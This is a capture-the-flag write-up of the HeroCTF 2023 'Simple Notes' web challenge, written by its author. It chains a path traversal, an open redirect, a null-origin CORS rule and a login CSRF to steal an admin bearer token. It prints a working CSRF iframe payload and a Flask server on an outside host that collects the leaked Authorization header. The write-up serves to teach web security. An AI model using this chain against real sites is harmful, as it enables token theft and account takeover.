---
source: kevin-mizu
source_url: https://mizu.re/post/simple-notes
title: "Simple Notes | mizu.re"
description: "Simple Notes"
---

_keyboard\_arrow\_up_

title: Simple Notes

date: May 15, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [HeroCTF\_v5](https://mizu.re/tag/HeroCTF_v5) [MyChallenges](https://mizu.re/tag/MyChallenges)

# Simple Notes

![logo.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/logo.png)

* * *

Difficulty: 500 points \| 2 solves

Description: Another classic note challenge... Or maybe not :)

Report a vulnerability: curl -kX POST -d 'url={{URL}}' [https://simplenotes.heroctf.fr/report](https://simplenotes.heroctf.fr/report)

(You must use a chromium based browser to solve this challenge)

Sources: [simple\_notes.zip](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/simple_notes.zip)

Author: [Me :p](https://twitter.com/kevin_mizu)

* * *

- [🕵️ Recon](https://mizu.re/post/simple-notes#%EF%B8%8F-recon)
- [🤖 Finding gadgets](https://mizu.re/post/simple-notes#-finding-gadgets)
  - [Client Side Path Traversal (CSPT)](https://mizu.re/post/simple-notes#client-side-path-traversal-cspt)
  - [Server Side Open Redirect (SSOR)](https://mizu.re/post/simple-notes#server-side-open-redirect-ssor)
  - [CORS misconfiguration](https://mizu.re/post/simple-notes#cors-misconfiguration)
  - [Unsafe Cookie Flag](https://mizu.re/post/simple-notes#unsafe-cookie-flag)
- [💎 Headers disclosure](https://mizu.re/post/simple-notes#-headers-disclosure)
- [🍪 CSRF](https://mizu.re/post/simple-notes#-csrf)
- [💥 Chain everything together](https://mizu.re/post/simple-notes#-chain-everything-together)
- [🚩 Retrieve the flag](https://mizu.re/post/simple-notes#-retrieve-the-flag)

## 🕵️ Recon

As at all CTFs, there is a web challenge with a note management application and simple notes was the one for the HeroCTF 2023!

- /login

![login.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/login.png)

- /notes

![notes.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/notes.png)

As always, it is possible to create notes, but unlike other notes challenges note's content isn't rendered and well sanitize.

- /static/js/main.js:

```js
var noHTML = (s) => {
    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

// Retracted

var handleNotes = (user, notes) => {
    var parse = (note) => {
        return `<tr>
            <td>
            <p class="fw-normal mb-1">${noHTML(note[1])}</p>
            <p class="text-muted mb-0">${noHTML(user)}</p>
            </td>
            <td>
            <span class="badge badge-success rounded-pill d-inline">Active</span>
            </td>
            <td>${noHTML(note[2])}</td>
            <td>
            <a href="/note/${noHTML(note[0])}" class="btn btn-link btn-sm btn-rounded">
                Edit
            </a>
            </td>
        </tr>`
    }

    output.innerHTML = `${notes.map(note => parse(note)).join("")}`;
}
```

In addition, the web application uses an API to manage users information / notes. To use this API, a bearer token located in the localStorage is used in addition of the session token to authenticate the user.

- /static/js/main.js

```js
var fetchAPI = async (path, method, data) => {
    var options = {};
    options.method = method;
    options.headers = {}
    options.headers["Content-Type"]  = "application/json";
    if (data)
        options.body = JSON.stringify(data);

    var bearer = localStorage.getItem("bearer");
    if (bearer)
        options.headers["Authorization"] = `Bearer ${bearer}`;

    return fetch(path, options).then(d => d.json()).then((d) => { return d });
}
```

So, for this challenge, we have to find a way to steal the admin user API Bearer without using an XSS :)

## 🤖 Finding gadgets

In this section, we are going to list all gadgets that has to be found to craft the final exploit.

### Client Side Path Traversal (CSPT)

If we look closely to the network tab of the developer console when loading the /notes endpoint, we can see that the current username is used to fetch the API.

- /notes

![network.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/network.png)

- /static/js/main.js

```js
var profileAPI = async (user) => {
    var res = await fetchAPI(`/api/user/${user}`, "GET")

    handleNotes(user, res["notes"]);

    return res["notes"]
}
```

So, if we can control the username of the admin user, it would be possible to achieve a client side path traversal. For example with ../../../:

![network2.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/network2.png)

### Server Side Open Redirect (SSOR)

Inside the main.js file, all routes used from client side are defined. Thanks to it, we can find an additional parameter (r) which is used to specify a redirect URL when logout. Because it is not sanitized, we can redirect the user to any URL we want.

- /static/js/main.js

```js
var logoutAPI = () => {
    localStorage.clear();
    location.href = "/logout?r=/login";
}
```

- /logout?r= [https://mizu.re](https://mizu.re/)

![redirect.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/redirect.png)

### CORS misconfiguration

The API has the following CORS configuration:

- /api/user/mizu

![cors.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/cors.png)

```
access-control-allow-credentials: true
access-control-allow-origin: null
```

This configuration is really interesting because, a sandboxed iframe has a null origin! For example, the following code can be used to read data in a cross-site configuration.

```js
var host = "https://example.com"

var ifr  = document.createElement("iframe");
ifr.sandbox = "allow-scripts allow-top-navigation";
ifr.srcdoc  = `<script>
    fetch("${host}/api/me").then(d => d.text()).then((d) => {
        alert(d);
    })
<\x2fscript>`;
document.body.appendChild(ifr);
```

WARNING: this won't be enough in the challenge configuration because, we need to provide an additional Bearer token!

### Unsafe Cookie Flag

The session cookie has SameSite set to None which allows cross-site usage!

## 💎 Headers disclosure

Well, now that we found several issues in the web application, we need to find a way to chain them to steal the admin's note. To do so, we have to abuse a very interesting fetch behavior 👀

Have you ever wondered what is happening to the headers of a fetch request when this request is triggered by a SSOR? If not, let's try on the challenge! (Ensure to use a chromium based browser!)

1. Create a user with ../../../logout?r= [https://webhook.site/{YOUR-ID](https://webhook.site/%7BYOUR-ID)}/ (Thanks to the CSPT, it will fetch the SSOR).
2. Log into his account.

You should have the following error:

![error.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/error.png)

This error comes from the fetch's pre-flight request made to webhook.site which doesn't return valid CORS to allow the query. To fix it, use the following flask application: (ensure to use HTTPs)

```py
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
cors = CORS(app, resources={
    r"/*": {
        "origins": "*"
    }
}, allow_headers=[\
    "Authorization",\
    "Content-Type"\
], supports_credentials=True)

@app.route("/")
def index():
    print(request.headers)
    return ""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5555, ssl_context=("cert/cert.pem", "cert/key.pem"))
```

Doing the exploit but with your own server should result in the following output:

![bearer.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/bearer.png)

Yes! The second request is build from options of the first one 👀

If you want to have more information about this behavior, feel free to read the following links:

- [\[WHATWG\] http fetch](https://fetch.spec.whatwg.org/#http-fetch)
- [\[WHATWG\] http redirect fetch](https://fetch.spec.whatwg.org/#http-redirect-fetch)
- [\[WHATWG\] Drop developer-controlled Authorization header on cross-origin redirects #944](https://github.com/whatwg/fetch/issues/944)

## 🍪 CSRF

Now that we found a way to steal the admin's API Bearer if we control his username, we need to find a way to force him to log into a vulnerable account without changing is localStorage bearer.

Something really important about the localStorage, is that it can't be changed Server Side. Thus, the developer has to "manually" set it when a user logs into the application.

```js
var loginAPI = async (username, password) => {
    var res = await fetchAPI("/api/login", "POST", {
        "username": username,
        "password": password
    })

    if (res["error"])
        handleError(res["error"]);

    if (res["bearer"]) {
        localStorage.setItem("bearer", res["bearer"]);
        location.href = "/notes";
    }
}
```

But, what would happen if, thanks to a CSRF, we log into the admin into our account cross-site? In fact, the session token will be updated, but not the API Bearer! Thanks to the previously found gadgets, we have everything needed to achieve it!

1. A CORS that allows our website to fetch the login endpoint.
2. The SameSite cookie flag must be set to None.

Example of exploit:

```html
<div id="exploit"></div>

<script>
    // Init
    var host = "https://simplenotes.heroctf.fr"
    var username = "../../logout?r=https://mizu.re:5555/";
    var password = "mizu";

    // Change account
    var ifr  = document.createElement("iframe");
    ifr.sandbox = "allow-scripts allow-top-navigation";
    ifr.srcdoc  = `<script>
        fetch("${host}/api/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "username": "${username}",
                "password": "${password}"
            }),
            credentials: "include"
        }).then(d => d.json()).then((d) => {
            top.location.href = "${host}/api/";
        })
    <\\x2Fscript>`;
    exploit.appendChild(ifr);
</script>
```

## 💥 Chain everything together

If we set up a flask server that abuse all gadget explained before, and send the CSRF link to the bot, we get it's API Bearer token!! 🎉

```py
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
cors = CORS(app, resources={
    r"/*": {
        "origins": "*"
    }
}, allow_headers=[\
    "Authorization",\
    "Content-Type"\
], supports_credentials=True)

@app.route("/")
def index():
    print(request.headers)
    return ""

@app.route("/csrf")
def csrf():
    return """
    <div id="exploit"></div>

    <script>
        // Init
        var host = "https://simplenotes.heroctf.fr"
        var username = "../../logout?r=https://mizu.re:5555/";
        var password = "mizu";

        // Change account
        var ifr  = document.createElement("iframe");
        ifr.sandbox = "allow-scripts allow-top-navigation";
        ifr.srcdoc  = `<script>
            fetch("${host}/api/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    "username": "${username}",
                    "password": "${password}"
                }),
                credentials: "include"
            }).then(d => d.json()).then((d) => {
                top.location.href = "${host}/api/";
            })
        <\\x2Fscript>`;
        exploit.appendChild(ifr);
    </script>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5555, ssl_context=("cert/cert.pem", "cert/key.pem"))
```

![admin_bearer.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/admin_bearer.png)

## 🚩 Retrieve the flag

Now that we have the admin token, we simply need to use it to get the flag! (You can use any a session token from any account :p)

- [https://jwt.io](https://jwt.io/)

![jwt.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/jwt.png)

- curl the API

![flag.png](https://mizu.re/articles/writeups/heroctf_2023/simple_notes/images/flag.png)

Flag: Hero{Cl13nT\_S1d3\_P4tH\_Tr4v3rS4l\_T0\_R3d1r3cT} 🎉

[_keyboard\_arrow\_left_ YouWatch](https://mizu.re/post/youwatch)

[Whiskers in the dark _keyboard\_arrow\_right_](https://mizu.re/post/whiskers-in-the-dark)